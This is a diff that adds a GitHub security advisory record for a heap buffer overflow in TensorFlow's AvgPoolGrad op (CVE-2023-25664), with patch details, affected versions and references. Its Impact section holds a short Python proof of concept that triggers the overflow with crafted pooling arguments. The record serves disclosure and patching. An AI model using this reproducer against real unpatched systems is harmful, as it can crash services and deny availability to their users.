@@ -1,0 +1,85 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-6hg6-5c2q-7rcr",
+  "modified": "2023-03-27T22:00:19Z",
+  "published": "2023-03-24T21:58:04Z",
+  "aliases": [
+    "CVE-2023-25664"
+  ],
+  "summary": "TensorFlow has Heap-buffer-overflow in AvgPoolGrad ",
+  "details": "### Impact\n```python\nimport os\nos.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'\nimport tensorflow as tf\nprint(tf.__version__)\nwith tf.device(\"CPU\"):\n    ksize = [1, 40, 128, 1]\n    strides = [1, 128, 128, 30]\n    padding = \"SAME\"\n    data_format = \"NHWC\"\n    orig_input_shape = [11, 9, 78, 9]\n    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)\n    res = tf.raw_ops.AvgPoolGrad(\n        ksize=ksize,\n        strides=strides,\n        padding=padding,\n        data_format=data_format,\n        orig_input_shape=orig_input_shape,\n        grad=grad,\n    )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ddaac2bdd099bec5d7923dea45276a7558217e5b](https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by <evn@google.com>\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow-cpu"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6hg6-5c2q-7rcr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25664"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tensorflow/tensorflow"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-120",
+      "CWE-122"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-24T21:58:04Z",
+    "nvd_published_at": "2023-03-25T00:15:00Z"
+  }
+}
